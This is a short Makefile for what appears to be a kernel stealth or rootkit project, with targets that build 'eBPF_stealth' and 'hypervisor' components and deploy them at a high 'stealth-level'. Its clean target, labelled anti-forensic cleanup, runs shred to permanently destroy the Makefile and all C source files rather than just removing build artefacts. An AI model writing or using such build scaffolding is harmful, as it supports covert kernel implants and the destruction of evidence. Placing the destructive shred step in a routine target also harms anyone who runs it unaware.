KDIR ?= /lib/modules/$(shell uname -r)/build
BPFTOOL ?= bpftool

all: eBPF_stealth hypervisor userland

eBPF_stealth:
	$(MAKE) -C src/eBPF_stealth

hypervisor:
	$(MAKE) -C src/hypervisor KDIR=$(KDIR)

userland:
	$(MAKE) -C src/userland

deploy:
	scripts/deploy.sh --target=kernel --stealth-level=5

clean:
	# Anti-forensic build cleanup
	shred -u Makefile *.c